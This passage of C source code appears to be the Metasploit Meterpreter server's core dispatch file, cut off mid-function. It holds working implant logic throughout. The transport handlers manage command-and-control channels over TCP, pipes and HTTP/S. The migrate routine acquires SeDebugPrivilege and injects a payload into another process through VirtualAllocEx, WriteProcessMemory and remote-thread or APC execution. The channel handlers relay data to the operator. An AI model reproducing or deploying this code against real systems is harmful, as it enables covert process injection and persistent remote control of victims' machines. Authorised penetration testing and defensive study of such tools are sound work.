#include "metsrv.h"
#include "base_inject.h"

DWORD get_migrate_context(LPDWORD contextSize, LPCOMMONMIGRATECONTEXT* contextBuffer)
{
	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATECONTEXT));

	if (*contextBuffer == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	*contextSize = sizeof(COMMONMIGRATECONTEXT);

	return ERROR_SUCCESS;
}

void set_transport_session_expiry(Remote* remote, Packet* packet)
{
	int sessionExpiry = 0;
	if (packet_get_tlv_uint(packet, TLV_TYPE_TRANS_SESSION_EXP, &sessionExpiry))
	{
		if (sessionExpiry)
		{
			remote->sess_expiry_time = sessionExpiry;
			remote->sess_expiry_end = current_unix_timestamp() + sessionExpiry;
		}
		else
		{
			remote->sess_expiry_time = 0;
			remote->sess_expiry_end = 0;
		}
	}
}

DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
{
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Transport* transport = NULL;
	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts = { 0 };

	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	// special case, will still leave this in here even if it's not transport related
	set_transport_session_expiry(remote, packet);

	if (timeouts.comms == 0)
	{
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0)
	{
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0)
	{
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do
	{
		if (transportUrl == NULL)
		{
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
		{
			MetsrvTransportTcp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}
		else if (wcsncmp(transportUrl, L"pipe", 4) == 0)
		{
			MetsrvTransportNamedPipe config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}
		else
		{
			BOOL ssl = wcsncmp(transportUrl, L"https", 5) == 0;
			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_HOST);
			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
			DWORD certHashLen = 0;
			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH, &certHashLen);
			wchar_t* headers = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_HEADERS);

			size_t configSize = sizeof(MetsrvTransportHttp);
			if (headers)
			{
				// this already caters for the null byte because it's included in the structure.
				configSize += wcslen(headers);
			}

			MetsrvTransportHttp* config = (MetsrvTransportHttp*)calloc(1, configSize);
			config->common.comms_timeout = timeouts.comms;
			config->common.retry_total = timeouts.retry_total;
			config->common.retry_wait = timeouts.retry_wait;
			wcsncpy(config->common.url, transportUrl, URL_SIZE);

			if (proxy)
			{
				wcsncpy(config->proxy.hostname, proxy, PROXY_HOST_SIZE);
				free(proxy);
			}

			if (proxyUser)
			{
				wcsncpy(config->proxy.username, proxyUser, PROXY_USER_SIZE);
				free(proxyUser);
			}

			if (proxyPass)
			{
				wcsncpy(config->proxy.password, proxyPass, PROXY_PASS_SIZE);
				free(proxyPass);
			}

			if (ua)
			{
				wcsncpy(config->ua, ua, UA_SIZE);
				free(ua);
			}

			if (certHash)
			{
				memcpy(config->ssl_cert_hash, certHash, CERT_HASH_SIZE);
				// No need to free this up as it's not a wchar_t
			}

			if (headers)
			{
				wcscpy(config->custom_headers, headers);
			}

			transport = remote->trans_create(remote, &config->common, NULL);

			free(config);
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	*transportBufer = transport;

	return result;
}

DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);

		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Add the session timeout to the top level
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());

		Transport* current = remote->transport;
		Transport* first = remote->transport;

		do
		{
			Packet* transportGroup = packet_create_group();

			if (!transportGroup)
			{
				// bomb out, returning what we have so far.
				break;
			}

			dprintf("[DISPATCH] Adding URL %S", current->url);
			packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_URL, current->url);
			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);

			switch (current->type)
			{
				case METERPRETER_TRANSPORT_HTTP:
				case METERPRETER_TRANSPORT_HTTPS:
				{
					HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
					dprintf("[DISPATCH] Transport is HTTP/S");
					if (ctx->ua)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
					}
					if (ctx->proxy)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
					}
					if (ctx->proxy_user)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
					}
					if (ctx->proxy_pass)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
					}
					if (ctx->cert_hash)
					{
						packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
					}
					if (ctx->custom_headers && ctx->custom_headers[0])
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_HEADERS, ctx->custom_headers);
					}
					break;
				}
			}

			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);

			current = current->next_transport;
		} while (first != current);
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
	if (remote->transport == remote->transport->next_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->next_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;

}

BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->prev_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;
}

DWORD remote_request_core_transport_remove(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;

	// make sure we are not trying to remove the last transport
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Refusing to delete the last transport");
		result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		Transport* found = NULL;
		Transport* transport = remote->transport;
		wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

		do
		{
			if (wcscmp(transportUrl, transport->url) == 0)
			{
				found = transport;
				break;
			}

			transport = transport->next_transport;
		} while (transport != remote->transport);

		if (found == NULL || found == remote->transport)
		{
			dprintf("[DISPATCH] Transport not found, or attempting to remove current");
			// if we don't have a valid transport, or they're trying to remove the
			// existing one, then bomb out (that might come later)
			result = ERROR_INVALID_PARAMETER;
		}
		else
		{
			remote->trans_remove(remote, found);
			dprintf("[DISPATCH] Transport removed");
		}

		SAFE_FREE(transportUrl);
	}

	packet_transmit_empty_response(remote, packet, result);
	dprintf("[DISPATCH] Response sent.");
	return result;
}

DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
{
	Transport* transport = NULL;
	DWORD result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, result);
	return result;
}

BOOL remote_request_core_transport_sleep(Remote* remote, Packet* packet, DWORD* result)
{
	// we'll reuse the comm timeout TLV for this purpose
	DWORD seconds = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);

	dprintf("[DISPATCH] request received to sleep for %u seconds", seconds);

	// to sleep, we simply jump to the same transport, with a delay
	remote->next_transport_wait = seconds;
	remote->next_transport = remote->transport;

	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);
	*result = ERROR_SUCCESS;

	// exit out of the dispatch loop
	return FALSE;
}

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
{
	Transport* transport = NULL;
	*result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, *result);

	if (*result == ERROR_SUCCESS)
	{
		remote->next_transport = transport;
		// exit out of the dispatch loop.
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Set the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// no setting of the cert hash if the target isn't a HTTPS transport
		if (remote->transport->type != METERPRETER_TRANSPORT_HTTPS)
		{
			result = ERROR_BAD_ENVIRONMENT;
			break;
		}

		DWORD certHashLen = 0;
		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH, &certHashLen);
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		// Support adding a new cert hash if one doesn't exist
		if (!ctx->cert_hash)
		{
			if (certHash)
			{
				PBYTE newHash = (unsigned char*)malloc(sizeof(unsigned char)* CERT_HASH_SIZE);
				if (!newHash)
				{
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}

				memcpy(newHash, certHash, CERT_HASH_SIZE);

				// Set it at the last minute. Mucking with "globals" and all, want to make sure we
				// don't set it too early.. just in case.
				ctx->cert_hash = newHash;
			}
			else
			{
				// at this time, don't support overwriting of the existing hash
				// as that will cause issues!
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
		}
		// support removal of the existing hash
		else
		{
			if (certHash)
			{
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
			else
			{
				SAFE_FREE(ctx->cert_hash);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Get the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Rather than error out if the transport isn't HTTPS, we'll just return
		// an empty response. This prevents a horrible error appearing in the
		// MSF console
		if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS)
		{
			HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
			if (ctx->cert_hash)
			{
				packet_add_tlv_raw(response, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Migrate the meterpreter server from the current process into another process.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @param pResult Pointer to the memory that will receive the result.
 * @returns Indication of whether the server should continue processing or not.
 */
BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResult)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet * response = NULL;
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	HANDLE hEvent = NULL;
	BYTE * lpPayloadBuffer = NULL;
	LPVOID lpMigrateStub = NULL;
	LPBYTE lpMemory = NULL;
	LPBYTE lpUuid = NULL;
	LPCOMMONMIGRATECONTEXT ctx = NULL;
	DWORD ctxSize = 0;
	DWORD dwMigrateStubLength = 0;
	DWORD dwPayloadLength = 0;
	DWORD dwProcessID = 0;
	DWORD dwDestinationArch = 0;

	MetsrvConfig* config = NULL;
	DWORD configSize = 0;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			dwResult = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Get the process identifier to inject into
		dwProcessID = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);

		// Get the target process architecture to inject into
		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);

		// Receive the actual migration payload buffer
		lpPayloadBuffer = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_PAYLOAD, &dwPayloadLength);

		// Get handles to the updated UUIDs if they're there
		DWORD uuidLen = 0;
		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID, &uuidLen);

		// Get the migrate stub information
		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB, &dwMigrateStubLength);

		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s", dwProcessID, dwDestinationArch == 2 ? "x64" : "x86");
		dprintf("[MIGRATE] Attempting to migrate. PayloadLength=%d StubLength=%d", dwPayloadLength, dwMigrateStubLength);

		// If we can, get SeDebugPrivilege...
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			TOKEN_PRIVILEGES priv = { 0 };

			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			{
				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
				{
					dprintf("[MIGRATE] Got SeDebugPrivilege!");
				}
			}

			CloseHandle(hToken);
		}

		// Open the process so that we can migrate into it
		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
		if (!hProcess)
		{
			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
		}

		// get the existing configuration
		dprintf("[MIGRATE] creating the configuration block");
		remote->config_create(remote, lpUuid, &config, &configSize);
		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);

		if (remote->transport->get_migrate_context != NULL)
		{
			dwResult = remote->transport->get_migrate_context(remote->transport, dwProcessID, hProcess, &ctxSize, (LPBYTE*)&ctx);
		}
		else
		{
			dwResult = get_migrate_context(&ctxSize, &ctx);
		}

		if (dwResult != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] Failed to create migrate context: %u", dwResult);
			break;
		}

		// Create a notification event that we'll use to know when it's safe to exit
		// (once the socket has been referenced in the other process)
		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!hEvent)
		{
			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed");
		}

		// Duplicate the event handle for the target process
		if (!DuplicateHandle(GetCurrentProcess(), hEvent, hProcess, &ctx->e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed");
		}

		dprintf("[MIGRATE] Duplicated Event Handle: 0x%x", (UINT_PTR)ctx->e.hEvent);

		// Allocate memory for the migrate stub, context, payload and configuration block
		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpMemory)
		{
			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed");
		}

		// Calculate the address of the payload...
		ctx->p.lpPayload = lpMemory + dwMigrateStubLength + ctxSize;

		// Write the migrate stub to memory...
		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed");
		}

		// Write the migrate context to memory...
		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, ctxSize);
		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, ctx, ctxSize, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed");
		}

		// Write the migrate payload to memory...
		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx->p.lpPayload, dwPayloadLength);
		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed");
		}

		// finally write the configuration stub
		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx->p.lpPayload + dwPayloadLength, configSize);
		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload + dwPayloadLength, config, configSize, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed");
		}

		free(ctx);

		// First we try to migrate by directly creating a remote thread in the target process
		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");

			// If that fails we can try to migrate via a queued APC in the target process
			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
			{
				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed");
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	SAFE_FREE(config);

	// If we failed and have not sent the response, do so now
	if (dwResult != ERROR_SUCCESS && response)
	{
		dprintf("[MIGRATE] Sending response");
		packet_transmit_response(dwResult, remote, response);
	}

	// Cleanup...
	if (hProcess)
	{
		dprintf("[MIGRATE] Closing the process handle 0x%08x", hProcess);
		CloseHandle(hProcess);
	}

	if (hEvent)
	{
		dprintf("[MIGRATE] Closing the event handle 0x%08x", hEvent);
		CloseHandle(hEvent);
	}

	if (pResult)
	{
		*pResult = dwResult;
	}

	// if migration succeeded, return 'FALSE' to indicate server thread termination.
	dprintf("[MIGRATE] Finishing migration, result: %u", dwResult);
	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		set_transport_session_expiry(remote, packet);

		if (commsTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		if (remote->sess_expiry_end)
		{
			packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
		}
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*
 * core_channel_open
 * -----------------
 *
 * Opens a channel with the remote endpoint.  The response handler for this
 * request will establish the relationship on the other side.
 *
 * opt: TLV_TYPE_CHANNEL_TYPE 
 *      The channel type to allocate.  If set, the function returns, allowing
 *      a further up extension handler to allocate the channel.
 */
DWORD remote_request_core_channel_open(Remote* remote, Packet* packet)
{
	Packet* response;
	DWORD res = ERROR_SUCCESS;
	Channel* newChannel;
	PCHAR channelType;
	DWORD flags = 0;

	do
	{
		dprintf("[CHANNEL] Opening new channel for packet %p", packet);

		// If the channel open request had a specific channel type
		if ((channelType = packet_get_tlv_value_string(packet, TLV_TYPE_CHANNEL_TYPE)))
		{
			res = ERROR_NOT_FOUND;
			break;
		}

		// Get any flags that were supplied
		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_FLAGS);

		dprintf("[CHANNEL] Opening %s %u", channelType, flags);

		// Allocate a response
		response = packet_create_response(packet);

		// Did the response allocation fail?
		if ((!response) || (!(newChannel = channel_create(0, flags))))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		dprintf("[CHANNEL] Opened %s %u", channelType, flags);

		// Get the channel class and set it
		newChannel->cls = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_CLASS);

		dprintf("[CHANNEL] Channel class for %s: %u", channelType, newChannel->cls);

		// Add the new channel identifier to the response
		if ((res = packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel))) != ERROR_SUCCESS)
		{
			break;
		}

		// Transmit the response
		dprintf("[CHANNEL] Sending response for %s", channelType);
		res = packet_transmit(remote, response, NULL);

		dprintf("[CHANNEL] Done");

	} while (0);

	return res;
}

/*
 * core_channel_open (response)
 * -----------------
 *
 * Handles the response to a request to open a channel.
 *
 * This function takes the supplied channel identifier and creates a
 * channel list entry with it.
 *
 * req: TLV_TYPE_CHANNEL_ID -- The allocated channel identifier
 */
DWORD remote_response_core_channel_open(Remote *remote, Packet *packet)
{
	DWORD res = ERROR_SUCCESS, channelId;
	Channel *newChannel;

	do
	{
		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);
		
		// DId the request fail?
		if (!channelId)
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Create a local instance of the channel with the supplied identifier
		if (!(newChannel = channel_create(channelId, 0)))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

	} while (0);

	return res;
}

/*
 * core_channel_write
 * ------------------
 *
 * Write data from a channel into the local output buffer for it
 */
DWORD remote_request_core_channel_write(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS, channelId, written = 0;
	Tlv channelData;
	Channel * channel = NULL;

	do
	{
		channelId = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);

		// Try to locate the specified channel
		if (!(channel = channel_find_by_id(channelId)))
		{
			res = ERROR_NOT_FOUND;
			break;
		}

		lock_acquire( channel->lock );

		// Get the channel data buffer
		if ((res = packet_get_tlv(packet, TLV_TYPE_CHANNEL_DATA, &channelData)) != ERROR_SUCCESS)
			break;

		// Handle the write operation differently based on the class of channel
		switch (channel_get_class(channel))
		{
			// If it's buffered, write it to the local buffer cache
			case CHANNEL_CLASS_BUFFERED:
				res = channel_write_to_buffered(channel, channelData.buffer, channelData.header.length, (PULONG)&written);
				break;
			// If it's non-buffered, call the native write operation handler if
			// one is implemented
			default:
				{
					NativeChannelOps *ops = (NativeChannelOps *)&channel->ops;
					if (ops->write)
						res = ops->write(channel, packet, ops->context, 
								channelData.buffer, channelData.header.length, 
								&written);
					else
						res = ERROR_NOT_SUPPORTED;
				}
				break;
		}

	} while (0);

	if( channel )
		lock_release( channel->lock );

	// Transmit the acknowledgement
	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_LENGTH, written);
		packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channelId);

		res = packet_transmit_response(res, remote, response);
	}

	return res;
}

/*
 * core_channel_read
 * -----------------
 *
 * From from the local buffer and write back to the requester
 *
 * Takes TLVs:
 *
 * req: TLV_TYPE_CHANNEL_ID -- The channel identifier to read from
 * req: TLV_TYPE_LENGTH     -- The number of bytes to read
 */
DWORD remote_request_core_channel_read(Remote *remote, Packet *packet)
{
	DWORD res = ERROR_SUCCESS, bytesToRead, bytesRead, channelId;
	Packet *response = packet_create_response(packet);
	PUCHAR temporaryBuffer = NULL;
	Channel *channel = NULL;

	do
	{
		if (!response)
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Get the number of bytes to read
		bytesToRead = packet_get_tlv_value_uint(packet, TLV_TYPE_LENGTH);
		channelId   = packet_get_tlv_value_uint(packet, TLV_TYPE_CHANNEL_ID);

		// Try to locate the specified channel
		if (!(channel = channel_find_by_id(channelId)))
		{
			res = ERROR_NOT_FOUND;
			break;
		}

		lock_acquire( channel->lock );

		// Allocate temporary storage
		if (!(temporaryBuffer = (PUCHAR)malloc(bytesToRead)))
		{
			res = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		switch (channel_get_class(channel))
		{
			// If it's buffered, read from the local buffer and either transmit 
			// the buffer in the response or write it back asynchronously
			// depending on the mode of the channel.
			case CHANNEL_CLASS_BUFFERED:
				// Read in from local
				res = channel_read_from_buffered(channel, temporaryBuffer, 
				    bytesToRead, (PULONG)&bytesRead);
				break;
			// Handle read I/O for the pool class
			case CHANNEL_CLASS_POOL:
				// If the channel has a read handler
				if (channel->ops.pool.read)
					res = channel->ops.pool.read(channel, packet, 
							channel->ops.pool.native.context, temporaryBuffer, 
							bytesToRead, &bytesRead);
				else
					res = ERROR_NOT_SUPPORTED;
				break;
			default:
				res = ERROR_NOT_SUPPORTED;
		}

		// If we've so far been successful and we have a temporary buffer...
		if ((res == ERROR_SUCCESS) &&(temporaryBuffer) && (bytesRead))
		{
			// If the channel should operate synchronously, add the data to theresponse
			if (channel_is_flag(channel, CHANNEL_FLAG_SYNCHRONOUS))
			{
				// if the channel data is ment to be compressed, compress it!
				if( channel_is_flag( channel, CHANNEL_FLAG_COMPRESS ) )
					packet_add_tlv_raw(response, TLV_TYPE_CHANNEL_DATA|TLV_META_TYPE_COMPRESSED, temporaryBuffer, bytesRead);
				else
					packet_add_tlv_raw(response, TLV_TYPE_CHANNEL_DATA, temporaryBuffer, bytesRead);

				res = ERROR_SUCCESS;
			}
			// Otherwise, asynchronously write the buffer to the remote endpoint
			else
			{
				if ((res = channel_write(channel, remote, NULL, 0, temporaryBuffer, bytesRead, NULL)) != ERROR_SUCCESS)
					break;
			}
		}

	} while (0);
	
	if( channel )
		lock_release( channel->lock );

	if (temporaryBuffer)
		free(temporaryBuffer);

